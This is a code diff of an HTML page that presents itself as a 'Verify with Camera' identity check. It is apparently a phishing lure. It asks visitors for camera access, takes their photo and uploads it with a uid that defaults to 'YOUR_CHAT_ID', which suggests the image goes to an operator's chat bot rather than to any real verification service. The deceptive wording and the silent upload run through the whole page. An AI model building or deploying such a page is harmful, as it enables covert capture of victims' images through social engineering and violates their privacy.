@@ -3,95 +3,47 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify Your Identity</title>
+  <title>Verify Identity</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
-    }
-
+    * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
     body {
-      margin: 0;
-      background: #f0f2f5;
-      color: #111;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      flex-direction: column;
+      margin: 0; background: #f9f9f9;
+      display: flex; justify-content: center; align-items: center;
+      height: 100vh; flex-direction: column;
     }
-
     .card {
-      background: white;
-      padding: 30px 25px;
-      border-radius: 14px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
+      background: white; padding: 30px; border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
+      width: 90%; max-width: 400px;
     }
-
-    h2 {
-      margin-bottom: 15px;
-      color: #333;
-    }
-
-    p {
-      font-size: 15px;
-      margin-bottom: 20px;
-      color: #666;
-    }
-
-    video {
-      border-radius: 10px;
-      width: 100%;
-      margin-bottom: 15px;
-    }
-
+    h2 { margin-bottom: 12px; color: #222; }
+    p { font-size: 14px; margin-bottom: 18px; color: #555; }
+    video { width: 100%; border-radius: 8px; margin-bottom: 15px; }
     button {
-      background-color: #007bff;
-      color: white;
-      padding: 12px 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      width: 100%;
+      background: #007bff; border: none; color: #fff;
+      padding: 12px 20px; font-size: 16px; border-radius: 8px;
+      cursor: pointer; width: 100%;
     }
-
-    button:hover {
-      background-color: #0056b3;
-    }
-
-    .footer {
-      margin-top: 20px;
-      font-size: 13px;
-      color: #aaa;
-    }
+    .footer { margin-top: 20px; font-size: 13px; color: #999; }
   </style>
 </head>
 <body>
   <div class="card">
     <h2>Verify with Camera</h2>
-    <p>For your security, please allow camera access and take a photo to verify your identity.</p>
+    <p>Please allow camera access and take a photo to confirm your identity.</p>
     <video id="video" autoplay muted></video>
     <button onclick="capture()">📸 Take Photo</button>
-    <form id="uploadForm" style="display:none;">
-      <input type="hidden" name="uid" id="uid" />
-      <input type="file" name="photo" id="photo" />
-    </form>
   </div>
   <div class="footer">Made with 💛 by <strong>WACIQ</strong></div>
 
   <script>
     const video = document.getElementById('video');
-    const uid = new URLSearchParams(window.location.search).get('uid');
-    document.getElementById('uid').value = uid;
+    const uid = new URLSearchParams(window.location.search).get('uid') || 'YOUR_CHAT_ID';
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => video.srcObject = stream)
-      .catch(() => alert('❌ Camera access denied.'));
+      .catch(() => alert('❌ Camera permission denied.'));
 
     function capture() {
       const canvas = document.createElement('canvas');
@@ -103,10 +55,13 @@
         formData.append('photo', blob, 'photo.jpg');
         formData.append('uid', uid);
 
-        fetch('/api/upload', { method: 'POST', body: formData })
-          .then(res => res.text())
-          .then(msg => alert(msg))
-          .catch(err => alert('❌ Error sending photo: ' + err));
+        fetch('/upload.js', {
+          method: 'POST',
+          body: formData
+        })
+        .then(res => res.text())
+        .then(msg => alert(msg))
+        .catch(err => alert('❌ Upload failed: ' + err));
       }, 'image/jpeg');
     }
   </script>
